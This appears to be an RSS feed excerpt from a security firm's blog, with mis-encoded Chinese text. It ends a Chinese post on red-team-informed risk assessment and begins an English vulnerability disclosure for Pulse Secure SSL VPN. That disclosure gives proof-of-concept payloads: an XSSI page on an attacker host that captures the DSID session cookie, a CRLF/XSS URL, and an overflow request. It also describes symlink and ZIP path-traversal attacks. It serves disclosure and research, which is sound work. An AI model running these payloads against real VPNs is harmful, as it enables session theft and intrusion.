      &lt;td style=&quot;text-align: center&quot;&gt;æ»²é€æ¸¬è©¦&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å¼±é»æƒæ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;é¢¨éšªè©•é‘‘&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;åˆ°é€™è£¡ï¼Œé™¤äº†è³‡å®‰äº‹ä»¶å¤–ï¼Œå¤§è‡´å¯ä»¥æ±ºå®šè¦ç”¨ä¾†å”åŠ©è©•ä¼°é˜²ç¦¦ç­–ç•¥æ‰€æ‡‰è©²é¸æ“‡çš„æ–¹æ³•ã€‚æ›´é‡è¦çš„æ˜¯åœ¨ä½¿ç”¨é€™äº›æ–¹æ³•å¾Œï¼Œè¦å°‡çµæœåé¥‹å›é¢¨éšªè©•é‘‘ä¸­ï¼Œå› ç‚ºç›¸è¼ƒæ–¼å…¶ä»–æ–¹æ³•é¢¨éšªè©•é‘‘æ˜¯ä¸€å€‹æœ€ç°¡å–®ä¸”å»£æ³›çš„æ–¹æ³•ï¼Œé€™æœ‰åŠ©æ–¼ä¼æ¥­æŒçºŒå°‡è³‡æºæŠ•æ³¨åœ¨é‡å¤§çš„é¢¨éšªä¸Šã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ¡ˆä¾‹&quot;&gt;æ¡ˆä¾‹&lt;/h2&gt;
&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘ä»¥ä¸€å€‹ç´…éšŠæ¼”ç·´æ¡ˆä¾‹ä¸­æ‰€ç™¼ç¾æ§åˆ¶æªæ–½çš„ç–æ¼ï¼Œä¾†æ”¹å–„ä¼æ¥­çš„é¢¨éšªè©•é‘‘æ–¹å¼ã€‚åŒæ™‚ï¼Œæˆ‘å€‘å°‡å…¥ä¾µçš„æˆæœå°æ‡‰è‡³ ISO27001:2013 çš„æœ¬æ–‡è¦æ±‚åŠæ§åˆ¶é …ç›®ï¼Œé€™äº›é …ç›®å¯ä»¥è¦–ç‚ºä»¥æ”»æ“Šè€…çš„è§’åº¦ç¨½æ ¸ä¼æ¥­çš„ç®¡ç†åˆ¶åº¦ï¼Œæ›´èƒ½åæ˜ åˆ¶åº¦çš„è½å¯¦æƒ…å½¢ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é …ç›®&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ç™¼ç¾&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;æœ¬æ–‡/é™„éŒ„&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æ ¸å¿ƒç³»çµ±ç›¤é»æœªå®Œæ•´&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æœ¬æ–‡ 4.3 æ±ºå®š ISMS ç¯„åœ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ç›£æ§ç¯„åœä¸è¶³&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æœ¬æ–‡ 4.2 é—œæ³¨æ–¹ä¹‹éœ€è¦èˆ‡æœŸæœ›&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ä¸åŒç³»çµ±ä½¿ç”¨ç›¸åŒå¸³è™Ÿå¯†ç¢¼&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.9.4.3 é€šè¡Œç¢¼ç®¡ç†ç³»çµ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ç®¡ç†å¸³è™Ÿå­˜åœ¨å¯†ç¢¼è¦å‰‡&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.9.4.3 é€šè¡Œç¢¼ç®¡ç†ç³»çµ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;AD é‡å¤§æ¼æ´æœªä¿®è£œ&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.12.6.1 æŠ€è¡“è„†å¼±æ€§ç®¡ç†&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æœªé™åˆ¶ä¾†æº IP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.9.4.1 ç³»çµ±å­˜å–é™åˆ¶&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;æ¬¡è¦ç¶²ç«™é˜²è­·ä¸è¶³&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.14.1.1 è³‡è¨Šå®‰å…¨è¦æ±‚äº‹é …åˆ†æåŠè¦æ ¼&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;VPN ç¶²æ®µå­˜å–å…§éƒ¨ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;é™„éŒ„ A.13.1.3 ç¶²è·¯å€éš”&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;å¦å¤–ï¼Œå¾æ¼”ç·´çš„çµæœå¯ä»¥ç™¼ç¾ä¸‹è¡¨é …æ¬¡ 1 åŠé …æ¬¡ 2 çš„æ©Ÿç‡éƒ½è¢«è­‰å¯¦æœƒç™¼ç”Ÿä¸”ä½æ–¼å…¥ä¾µæ ¸å¿ƒè³‡ç”¢çš„è·¯å¾‘ä¸Šï¼Œå› æ­¤è¡æ“ŠåŠæ©Ÿç‡å‡æ‡‰è©²ç”±åŸæœ¬çš„ 2 æå‡ç‚º 3ï¼Œé€™å°è‡´é …æ¬¡ 1 çš„é¢¨éšªå€¼è¶…éäº†ä¼æ¥­åŸæœ¬è¨­å®šçš„å¯æ¥å—é¢¨éšª (27)ï¼›å¦å¤–ï¼Œå„˜ç®¡åœ¨æ¼”ç·´çµæœä¸­æ¸…æ¥šçš„çŸ¥é“é …æ¬¡ 2 çš„å…§éƒ¨å·®å‹¤ç³»çµ±æ˜¯å¿…ç„¶å¯ä»¥æˆåŠŸå…¥ä¾µä¸”é–“æ¥æ§åˆ¶æ ¸å¿ƒè³‡ç”¢çš„ç³»çµ±ï¼Œå…¶é¢¨éšªå€¼ä»é ä½æ–¼ä¼æ¥­æœƒé€²è¡Œè™•ç†çš„é¢¨éšªï¼Œé€™æ­£æ˜¯æˆ‘å€‘å‰é¢æ‰€æåˆ°ä½ä¼°æˆ°ç•¥åƒ¹å€¼çš„å•é¡Œï¼Œå› æ­¤æˆ‘å€‘æœƒå»ºè­°ï¼Œ&lt;strong&gt;åœ¨ç´…éšŠæ¼”ç·´è·¯å¾‘ä¸Šå¯ä»¥ç²å¾—æ ¸å¿ƒè³‡ç”¢çš„é¢¨éšªé …ç›®ï¼Œéƒ½æ‡‰è©²è¦–ç‚ºä¸å¯æ¥å—é¢¨éšªä¾†é€²è¡Œè™•ç†&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é …æ¬¡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è³‡ç”¢åç¨±&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;åƒ¹å€¼&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¨è„…&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;å¼±é»&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;è¡æ“Š&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;æ©Ÿç‡&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;é¢¨éšª&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç‰ˆæœ¬æ›´æ–°ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æœªç¶“æˆæ¬Šå­˜å–&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;æ©«å‘ç§»å‹•&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;å…§éƒ¨å·®å‹¤ç³»çµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç³»çµ±å…¥ä¾µ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ç„¡æ³•ä¸Š patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;æœ€å¾Œï¼Œå¼•ç”¨ &lt;a href=&quot;/blog/author/shaolin/&quot;&gt;Shaolin&lt;/a&gt; åœ¨ç ”è¨æœƒä¸Šçš„çµèª&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;ç´…éšŠæ¼”ç·´çš„ç²¾é«“ä¸æ˜¯åœ¨å‘Šè¨´ä½ æœ‰å¤šè„†å¼±ï¼Œåœ¨æ–¼çœŸæ­£å£äººé—–å…¥æ™‚ä½ å¯ä»¥ç¨ç•¶ä¸€é¢æ“‹ä¸‹ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;å¸Œæœ›å„ä½éƒ½èƒ½æ‰¾åˆ°å¯ä»¥æŒçºŒæ”¹å–„é˜²ç¦¦ç­–ç•¥çš„æ–¹æ³•ï¼Œè®“ä¼æ¥­çš„ç’°å¢ƒæ›´åŠ å®‰å…¨ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/09/def-strategy/</link>
                <guid>https://devco.re/blog/2019/10/09/def-strategy</guid>
                <pubDate>Wed, 09 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Hi, this is the last part of Attacking SSL VPN series. If you havenâ€™t read previous articles yet, here are the quick links for you:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.&lt;/p&gt;

&lt;p&gt;We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!&lt;/p&gt;

&lt;p&gt;Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub&lt;sup&gt;&lt;a href=&quot;https://github.com/milo2012/CVE-2018-13379&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://github.com/milo2012/CVE-2018-13382&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/projectzeroindia/CVE-2019-11510&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt; and exploit-db&lt;sup&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47297&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Honestly, we couldnâ€™t say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But itâ€™s indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?&lt;/p&gt;

&lt;p&gt;We heard about more than 25 bug bounty programs are exploited. From the statistics of &lt;a href=&quot;https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/&quot;&gt;Bad Packet&lt;/a&gt;, numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even &lt;a href=&quot;https://twitter.com/sherlocksecure/status/1164492373591642112&quot;&gt;10 NASA servers exposed for this bug&lt;/a&gt;. So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.&lt;/p&gt;

&lt;p&gt;On the other hand, the bad part is that there is an increasing number of &lt;a href=&quot;https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products&quot;&gt;botnets&lt;/a&gt; scanning the Internet in the meanwhile. An &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1167170305577689091&quot;&gt;intelligence&lt;/a&gt; also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you havenâ€™t updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!&lt;/p&gt;

&lt;h1 id=&quot;about-pulse-secure&quot;&gt;About Pulse Secure&lt;/h1&gt;

&lt;p&gt;Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a &lt;a href=&quot;https://archive.li/8pzwf&quot;&gt;critical infrastructure of Google&lt;/a&gt;, which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that itâ€™s hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading &lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt; on FortiGate SSL VPN on our first research dayâ€¦&lt;/p&gt;

&lt;p&gt;Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on &lt;strong&gt;March 8, 2019&lt;/strong&gt;! Itâ€™s a stack-based overflow on the management interface! Although this bug isnâ€™t that useful, our research progress got on track since that, and we uncovered more and more bugs.&lt;/p&gt;

&lt;p&gt;We reported all of our finding to Pulse Secure PSIRT on &lt;strong&gt;March 22, 2019&lt;/strong&gt;. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, &lt;strong&gt;they fixed all bugs just within a month&lt;/strong&gt;, and released the patches on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. You can check the detailed &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&quot;&gt;security advisory&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;Itâ€™s a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;affected-versions&quot;&gt;Affected versions&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2019-11540-cross-site-script-inclusion&quot;&gt;CVE-2019-11540: Cross-Site Script Inclusion&lt;/h2&gt;

&lt;p&gt;The script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/cs/cs.cgi&lt;/code&gt; renders the session ID in JavaScript. As the content-type is set to &lt;code class=&quot;highlighter-rouge&quot;&gt;application/x-javascript&lt;/code&gt;, we could perform the XSSI attack to steal the DSID cookie!&lt;/p&gt;

&lt;p&gt;Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- http://attacker/malicious.html --&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/dana/cs/cs.cgi?action=appletobj&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;writeln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DSID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ReplaceContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11507-cross-site-scripting&quot;&gt;CVE-2019-11507: Cross-Site Scripting&lt;/h2&gt;

&lt;p&gt;There is a CRLF Injection in &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/home/cts_get_ica.cgi&lt;/code&gt;. Due to the injection, we can forge arbitrary HTTP headers and inject malicious HTML contents.&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&amp;amp;vdi=1
&amp;amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&amp;lt;svg/onload=alert(document.domain)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11538-post-authuser-arbitrary-file-reading-via-nfs&quot;&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading via NFS&lt;/h2&gt;

&lt;p&gt;The following two vulnerabilities (CVE-2019-11538 and CVE-2019-11508) do not affect default configurations. It appears only if the admin configures the NFS sharing for the VPN users.&lt;/p&gt;

&lt;p&gt;If an attacker can control any files on remote NFS server, he can just create a symbolic link to any file, such as &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, and read it from web interface. The root cause is that the implementation of NFS mounts the remote server as a real Linux directory, and the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/fb/nfs/nfb.cgi&lt;/code&gt; does not check whether the accessed file is a symlink or not!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11508-post-authuser-arbitrary-file-writing-via-nfs&quot;&gt;CVE-2019-11508: Post-auth(user) Arbitrary File Writing via NFS&lt;/h2&gt;

&lt;p&gt;This one is a little bit similar to the previous one, but with a different attack vector!&lt;/p&gt;

&lt;p&gt;When the attacker uploads a ZIP file to the NFS through the web interface, the script &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana/fb/nfs/nu.cgi&lt;/code&gt; does not sanitize the filename in the ZIP. Therefore, an attacker can build a malicious ZIP file and traverse the path with &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; in the filename! Once Pulse Secure decompresses, the attacker can upload whatever he wants to whatever path!&lt;/p&gt;

&lt;h2 id=&quot;cve-2019-11542-post-authadmin-stack-buffer-overflow&quot;&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/h2&gt;

&lt;p&gt;There is a stack-based buffer overflow in the following Perl module implementations:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DSHC::ConsiderForReporting&lt;/li&gt;
  &lt;li&gt;DSHC::isSendReasonStringEnabled&lt;/li&gt;
  &lt;li&gt;DSHC::getRemedCustomInstructions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These implementations use &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; to concatenate strings without any length check, which leads to the buffer overflow. The bug can be triggered in many places, but here we use &lt;code class=&quot;highlighter-rouge&quot;&gt;/dana-admin/auth/hc.cgi&lt;/code&gt; as our PoC.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&amp;amp;policyid=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you can observed the segment fault from &lt;code class=&quot;highlighter-rouge&quot;&gt;dmesg&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;cve-2019-11510-pre-auth-arbitrary-file-reading&quot;&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/h2&gt;

&lt;p&gt;Actually, this is the most severe bug in this time. It is in the web server implementation. As our slides mentioned, Pulse Secure implements their own web server and architecture stack from scratch. The original path validation is very strict. However, since version 8.2, Pulse Secure introduced a new feature called &lt;code class=&quot;highlighter-rouge&quot;&gt;HTML5 Access&lt;/code&gt;, itâ€™s a feature used to interact with Telnet, SSH, and RDP by browsers. Thanks to this new feature, the original path validation becomes loose.&lt;/p&gt;

